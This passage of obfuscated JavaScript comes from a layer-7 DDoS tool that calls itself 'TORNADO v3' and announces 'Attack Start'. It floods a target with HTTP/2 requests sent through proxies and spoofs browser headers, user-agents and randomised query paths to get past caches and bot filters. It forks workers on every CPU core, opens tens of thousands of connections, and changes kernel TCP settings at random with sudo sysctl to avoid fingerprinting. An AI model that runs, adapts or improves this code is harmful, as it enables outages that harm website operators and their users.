            var _0x9c5e3f = (234468 ^ 234477) + (990528 ^ 990532);
            const _0xb4_0xea4 = _0xg4gfa === "Brave";
            _0x9c5e3f = "kjgedn".split("").reverse().join("");
            const _0x92a7d = _0xb4_0xea4 ? "8.0=q;*/*,gnpa/egami,pbew/egami,fiva/egami,9.0=q;lmx/noitacilppa,lmx+lmthx/noitacilppa,lmth/txet".split("").reverse().join("") : "7.0=q;3b=v;egnahcxe-dengis/noitacilppa,8.0=q;*/*,gnpa/egami,pbew/egami,fiva/egami,9.0=q;lmx/noitacilppa,lmx+lmthx/noitacilppa,lmth/txet".split("").reverse().join("");
            var _0x9a96e;
            const _0x142f = _0xb4_0xea4 ? "9.0=q;ne,SU-ne".split("").reverse().join("") : "en-US,en;q=0.7";
            _0x9a96e = "hjkofd".split("").reverse().join("");
            const _0xdfc56f = customUA || `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${_0x08b8fd}.0.0.0 Safari/537.36`;
            const _0xe1b66c = refererValue === "dnar".split("").reverse().join("") ? "https://" + ememmmmmemmeme(994810 ^ 994812, 810757 ^ 810755) + ".net" : refererValue;
            function _0xcf83bc(query) {
              if (query === "1") {
                return url.pathname + "=kt_tr_lhc_fc__?".split("").reverse().join("") + randstrr(329997 ^ 330003) + "_" + randstrr(401358 ^ 401346) + "-" + timestampString + "-0-gaNy" + randstrr(863244 ^ 863236);
              } else if (query === "2") {
                return url.pathname + "?" + randstr(626050 ^ 626053) + "&" + randstr(936672 ^ 936679);
              } else if (query === "3") {
                return url.pathname + "=q?".split("").reverse().join("") + randstr(669798 ^ 669793) + "&" + randstr(496061 ^ 496058);
              } else {
                return url.pathname;
              }
            }
            var _0xb85ec;
            const _0xcaf21b = Object.entries({
              ":method": reqmethod,
              ":authority": url.hostname,
              ":scheme": "https",
              ":path": query ? _0xcf83bc(query) : url.pathname + (postdata ? `?${postdata}` : "")
            }).concat(Object.entries({
              ...(Math.random() < 0.4 && {
                "cache-control": "max-age=0"
              }),
              ...(reqmethod === "TSOP".split("").reverse().join("") && {
                "content-length": "0"
              }),
              "sec-ch-ua": _0xbf39c,
              "sec-ch-ua-mobile": "?0",
              "sec-ch-ua-platform": `"Windows"`,
              "upgrade-insecure-requests": "1",
              "user-agent": _0xdfc56f,
              accept: _0x92a7d,
              ...(_0xb4_0xea4 && {
                "sec-gpc": "1"
              }),
              ...(Math.random() < 0.5 && {
                "sec-fetch-site": _0xe1b66c ? "same-site" : "none"
              }),
              ...(Math.random() < 0.5 && {
                "sec-fetch-mode": "navigate"
              }),
              ...(Math.random() < 0.5 && {
                "sec-fetch-user": "?1"
              }),
              ...(Math.random() < 0.5 && {
                "sec-fetch-dest": "document"
              }),
              "accept-encoding": "gzip, deflate, br",
              "accept-language": _0x142f,
              ...(hcookie && {
                cookie: hcookie
              }),
              ...(_0xe1b66c && {
                referer: _0xe1b66c
              }),
              ..._0xbef1bc.reduce((acc, header) => ({
                ...acc,
                ...header
              }), {})
            }).filter(a => a[669648 ^ 669649] !== null && a[722268 ^ 722269] !== undefined));
            _0xb85ec = (540539 ^ 540542) + (817751 ^ 817747);
            var _0xb24def;
            const _0xfb5e = Buffer.concat([Buffer.from([729519 ^ 729391, 455664 ^ 455664, 610512 ^ 610512, 707263 ^ 707263, 329275 ^ 329412]), _0x59722g.encode(_0xcaf21b)]);
            _0xb24def = (930630 ^ 930627) + (820796 ^ 820795);
            _0x6g85e.push(encodeFrame(_0x65e, 286496 ^ 286497, _0xfb5e, 528302 ^ 528267));
            _0x65e += 586130 ^ 586128;
            if (_0x65e > 2147483647) {
              _0x65e = 368481 ^ 368480;
            }
          }
          _0x2f_0x913.write(Buffer.concat(_0x6g85e), err => {
            if (!err) {
              const _0x95b = isUltra ? 861191 ^ 861191 : isFull ? 679995 ^ 680031 : (159089 ^ 159385) / _0x9dcf;
              // TOLOOK
              setTimeout(_0x59adeb, _0x95b);
            }
          });
        }
        _0x59adeb();
      }).on("error", err => {
        connectionAttempts++;
        _0x2f_0x913.destroy();
        // TOLOOK
        setTimeout(go, 302035 ^ 302007);
      });
    });
    _0x52870f.write(`CONNECT ${url.host}:443 HTTP/1.1\r\nHost: ${url.host}:443\r\nProxy-Connection: Keep-Alive\r\n\r\n`);
  }).on("error", err => {
    connectionAttempts++;
    // TOLOOK
    setTimeout(go, 282788 ^ 282816);
  }).on("close", () => {
    if (_0x2f_0x913) {
      _0x2f_0x913.end(() => {
        _0x2f_0x913.destroy();
        // TOLOOK
        setTimeout(go, 693858 ^ 693766);
      });
    } else {
      // TOLOOK
      setTimeout(go, 347579 ^ 347615);
    }
  });
  _0xa338fd = 394538 ^ 394536;
}
function TCP_CHANGES_SERVER() {
  const _0x87f8fa = ["cubic", "reno", "rbb".split("").reverse().join(""), "dctcp", "albyh".split("").reverse().join("")];
  var _0x5e_0x51b;
  const _0x207ba = ["1", "0"];
  _0x5e_0x51b = "nqblkk";
  const _0xeee = ["1", "0"];
  var _0xf3_0x564 = (863510 ^ 863506) + (138589 ^ 138589);
  const _0xc2_0x5ba = ["1", "0"];
  _0xf3_0x564 = (976770 ^ 976769) + (680808 ^ 680811);
  var _0x3_0xb12;
  const _0x233c2f = ["1", "0"];
  _0x3_0xb12 = (667028 ^ 667028) + (394817 ^ 394822);
  const _0x7_0xfd1 = ["3", "2", "1", "0"];
  var _0x9g10c = (117193 ^ 117185) + (442898 ^ 442896);
  const _0xg5b = _0x87f8fa[Math.floor(Math.random() * _0x87f8fa.length)];
  _0x9g10c = "hknkfl".split("").reverse().join("");
  const _0xfcecc = _0x207ba[Math.floor(Math.random() * _0x207ba.length)];
  var _0xbb6d;
  const _0xc3_0xff1 = _0xeee[Math.floor(Math.random() * _0xeee.length)];
  _0xbb6d = (750341 ^ 750336) + (858656 ^ 858665);
  const _0x018af = _0xc2_0x5ba[Math.floor(Math.random() * _0xc2_0x5ba.length)];
  const _0x8a_0x163 = _0x233c2f[Math.floor(Math.random() * _0x233c2f.length)];
  var _0x1ea33e;
  const _0xa67b3a = _0x7_0xfd1[Math.floor(Math.random() * _0x7_0xfd1.length)];
  _0x1ea33e = (205015 ^ 205012) + (276841 ^ 276844);
  const _0x4g4afd = `sudo sysctl -w net.ipv4.tcp_congestion_control=${_0xg5b} \
net.ipv4.tcp_sack=${_0xfcecc} \
net.ipv4.tcp_window_scaling=${_0xc3_0xff1} \
net.ipv4.tcp_timestamps=${_0x018af} \
net.ipv4.tcp_sack=${_0x8a_0x163} \
net.ipv4.tcp_fastopen=${_0xa67b3a}`;
  exec(_0x4g4afd, () => {});
}
// TOLOOK
setInterval(() => {
  timer++;
}, 247263 ^ 247351);
// TOLOOK
setInterval(() => {
  if (timer <= (918420 ^ 918430)) {
    custom_header = custom_header + (602709 ^ 602708);
    custom_window = custom_window + (429107 ^ 429106);
    custom_table = custom_table + (885016 ^ 885017);
    custom_update = custom_update + (597581 ^ 597580);
  } else {
    custom_table = 65536;
    custom_window = 6291456;
    custom_header = 262144;
    custom_update = 15663105;
    timer = 659415 ^ 659415;
  }
}, 720786 ^ 710786);

if (cluster.isMaster) {
    const workers = {};
    const CPUS = os.cpus().length;
    
    // 计算最大worker数量
    const maxWorkers = isUltra ? Math.min(threads * 2, CPUS * 4) : threads;
    
    console.log(`Attack Start - TORNADO v3 Fixed by @MOemo888 - Workers: ${maxWorkers} - Ultra Mode: ${isUltra}`);
    
    // 分批启动worker优化
    const BATCH_SIZE = Math.min(CPUS * 2, 32);
    const BATCH_DELAY = 100;
    
    async function startWorkersInBatches() {
        for (let batch = 0; batch < Math.ceil(maxWorkers / BATCH_SIZE); batch++) {
            const start = batch * BATCH_SIZE;
            const end = Math.min(start + BATCH_SIZE, maxWorkers);
            
            for (let i = start; i < end; i++) {
                cluster.fork({
                    core: i % CPUS,
                    workerId: i
                });
            }
            
            if (batch < Math.ceil(maxWorkers / BATCH_SIZE) - 1) {
                await new Promise(resolve => setTimeout(resolve, BATCH_DELAY));
            }
        }
    }
    
    startWorkersInBatches().catch(console.error);

    cluster.on("exit", worker => {
        // 延迟重启避免密集创建
        setTimeout(() => {
            cluster.fork({
                core: worker.id % CPUS
            });
        }, 500);
    });

    cluster.on("message", (worker, message) => {
        workers[worker.id] = [worker, message];
    });

    if (debugMode) {
        setInterval(() => {
            let statuses = {};
            let onlineCount = 0;
            
            for (let w in workers) {
                if (workers[w][0].state === "online") {
                    onlineCount++;
                    for (let st of workers[w][1]) {
                        for (let code in st) {
                            statuses[code] = (statuses[code] || 0) + st[code];
                        }
                    }
                }
            }
            
            console.clear();
            console.log(new Date().toLocaleString("us"), 
                       `Online: ${onlineCount}/${maxWorkers}`, 
                       statuses);
        }, 1000);
    }

    setInterval(TCP_CHANGES_SERVER, 5000);
    
    setTimeout(() => {
        console.log('Attack completed, exiting...');
        process.exit(1);
    }, time * 1000);

} else {
    let conns = 0;
    
    // 计算最大连接数
    const maxConns = isUltra ? 30000 : 20000;
    const connDelay = isUltra ? 0 : delay;
    
    // 使用批量连接创建优化
    const CONN_BATCH = isUltra ? 100 : 50;
    let active = true;

    function createConnectionsBatch() {
        if (!active) return;
        
        const batchSize = Math.min(CONN_BATCH, maxConns - conns);
        if (batchSize <= 0) {
            clearInterval(connectionInterval);
            return;
        }
        
        for (let i = 0; i < batchSize; i++) {
            if (conns < maxConns) {
                conns++;
                try {
                    go();
                } catch (err) {
                    conns--; // 出错时回滚计数
                }
            }
        }
    }

    const connectionInterval = setInterval(createConnectionsBatch, connDelay);
    
    // 立即启动第一批
    createConnectionsBatch();

    if (debugMode) {
        setInterval(() => {
            if (statusesQ.length >= 4) {
                statusesQ.shift();
            }
            statusesQ.push(statuses);
            statuses = {};
            
            // 减少IPC频率，只在有数据时发送
            if (statusesQ.length > 0) {
                process.send(statusesQ);
            }
        }, 1000); // 降低到1秒
    }

    setTimeout(() => {
        active = false;
        clearInterval(connectionInterval);
        process.exit(1);
    }, time * 1000);
}
